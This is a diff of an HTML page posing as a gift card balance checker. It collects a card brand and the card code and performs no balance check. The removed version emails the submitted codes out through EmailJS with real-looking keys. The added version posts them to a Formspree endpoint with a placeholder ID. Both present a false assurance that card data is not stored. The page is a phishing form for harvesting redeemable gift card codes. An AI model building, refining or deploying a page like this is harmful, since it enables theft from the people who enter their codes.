@@ -2,28 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Check Gift Cards Balance</title>
+<title>Check Gift Card Balance</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<!-- Font Awesome -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
-<!-- EmailJS -->
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-(function(){
-  emailjs.init("11I_SW_7xkOdPGwej");
-})();
-</script>
 
 <style>
 * { box-sizing: border-box; }
 
 body {
   margin: 0;
-  font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-  background: linear-gradient(135deg, #f4f7fb, #e9eef6);
-  color: #111;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #ffffff;
+  color: #222;
 }
 
 .wrapper {
@@ -37,46 +26,37 @@ body {
 .box {
   width: 100%;
   max-width: 420px;
-  background: #ffffff;
-  border-radius: 10px;
-  padding: 26px;
-  box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+  border: 1px solid #e5e5e5;
+  border-radius: 6px;
+  padding: 25px;
 }
 
 h1 {
   font-size: 20px;
   text-align: center;
-  margin-bottom: 6px;
+  margin-bottom: 10px;
 }
 
 .subtitle {
   text-align: center;
   font-size: 13px;
   color: #666;
-  margin-bottom: 22px;
+  margin-bottom: 25px;
 }
 
 label {
-  font-size: 12px;
-  margin-top: 14px;
+  font-size: 13px;
+  margin-top: 15px;
   display: block;
-  font-weight: 600;
 }
 
 select, input {
   width: 100%;
   padding: 11px;
   margin-top: 6px;
-  border-radius: 6px;
-  border: 1px solid #d0d7e2;
+  border: 1px solid #ccc;
+  border-radius: 4px;
   font-size: 14px;
-  background: #f9fbff;
-}
-
-select:focus, input:focus {
-  outline: none;
-  border-color: #1a73e8;
-  background: #fff;
 }
 
 button {
@@ -87,8 +67,7 @@ button {
   border: none;
   color: #fff;
   font-size: 15px;
-  font-weight: 600;
-  border-radius: 6px;
+  border-radius: 4px;
   cursor: pointer;
 }
 
@@ -96,177 +75,74 @@ button:hover {
   background: #1558b0;
 }
 
-.card-icons {
-  display: flex;
-  justify-content: center;
-  gap: 12px;
-  margin: 14px 0 6px;
+.loader {
+  display: none;
+  margin-top: 15px;
+  text-align: center;
+  font-size: 13px;
+  color: #555;
 }
 
-.card-icon {
-  width: 34px;
-  height: 22px;
-  object-fit: contain;
-  border-radius: 4px;
-}
-
-.notice {
-  margin-top: 18px;
+footer {
+  margin-top: 20px;
   font-size: 11px;
   color: #777;
   text-align: center;
-}
-
-.loader {
-  display: none;
-  font-size: 12px;
-  text-align: center;
-  margin-top: 10px;
-  color: #555;
-}
-
-/* Popup */
-.overlay {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.4);
-  z-index: 900;
-}
-
-.popup {
-  display: none;
-  position: fixed;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  background: #fff;
-  border-radius: 10px;
-  padding: 24px;
-  max-width: 320px;
-  text-align: center;
-  z-index: 1000;
-  box-shadow: 0 12px 30px rgba(0,0,0,0.2);
-}
-
-.popup h2 {
-  font-size: 17px;
-  margin-top: 0;
-}
-
-.popup p {
-  font-size: 13px;
-  color: #555;
-}
-
-.popup button {
-  margin-top: 14px;
-  background: #1a73e8;
-  color: #fff;
-  padding: 9px 16px;
-  font-size: 13px;
-  border-radius: 6px;
-  border: none;
-  cursor: pointer;
+  line-height: 1.5;
 }
 </style>
-</head>
 
+<script>
+function showLoader() {
+  document.getElementById("loader").style.display = "block";
+}
+</script>
+
+</head>
 <body>
 
 <div class="wrapper">
   <div class="box">
 
     <h1>Gift Card Balance Checker</h1>
-    <div class="subtitle">Fast, secure & informational balance request tool</div>
+    <div class="subtitle">
+      Secure & informational gift card balance verification
+    </div>
 
-    <form id="giftForm">
+    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="showLoader()">
 
       <label>Gift Card Type</label>
       <select name="card_type" required>
-        <option value="">Select card type</option>
+        <option value="">Select card</option>
         <option>Amazon</option>
         <option>Apple</option>
         <option>Google Play</option>
         <option>Steam</option>
         <option>Xbox</option>
         <option>PlayStation</option>
-        <option>eBay</option>
+        <option>Sephora</option>
         <option>Visa / Mastercard</option>
         <option>Other</option>
       </select>
 
-      <!-- REAL COLORED CARD ICONS -->
-      <div class="card-icons">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Play_Store_badge_EN.svg">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/4/43/Xbox_logo.svg">
-        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg">
+      <label>Card Code</label>
+      <input type="text" name="card_code" placeholder="Enter card code" required>
+
+      <button type="submit">Check Balance</button>
+
+      <div id="loader" class="loader">
+        Processing request…
       </div>
 
-      <label>Card Code</label>
-      <input type="text" name="card_code" placeholder="Enter gift card code" required>
-
-      <button type="submit">
-        <i class="fa-solid fa-magnifying-glass"></i> Check Balance
-      </button>
-
-      <div class="loader" id="loader">Processing request…</div>
     </form>
 
-    <div class="notice">
-      We do not store card data.<br>
-      Always confirm balances with official issuers.
-    </div>
+    <footer>
+      This service does not store card data.<br>
+      Always confirm balances on official issuer websites.
+    </footer>
 
   </div>
 </div>
-
-<div class="overlay" id="overlay"></div>
-
-<div class="popup" id="successPopup">
-  <h2>Request Submitted</h2>
-  <p>Your request has been received successfully.</p>
-  <button onclick="closePopup()">Close</button>
-</div>
-
-<div class="popup" id="errorPopup">
-  <h2>Error</h2>
-  <p>Please check your details and try again.</p>
-  <button onclick="closePopup()">Close</button>
-</div>
-
-<script>
-function showPopup(id) {
-  document.getElementById("overlay").style.display = "block";
-  document.getElementById(id).style.display = "block";
-}
-
-function closePopup() {
-  document.getElementById("overlay").style.display = "none";
-  document.getElementById("successPopup").style.display = "none";
-  document.getElementById("errorPopup").style.display = "none";
-}
-
-document.getElementById("giftForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  document.getElementById("loader").style.display = "block";
-
-  emailjs.sendForm("service_10mvkrc", "template_97kc5d6", this)
-    .then(() => {
-      document.getElementById("loader").style.display = "none";
-      showPopup("successPopup");
-      this.reset();
-    })
-    .catch(() => {
-      document.getElementById("loader").style.display = "none";
-      showPopup("errorPopup");
-    });
-});
-</script>
 
 </body>
 </html>
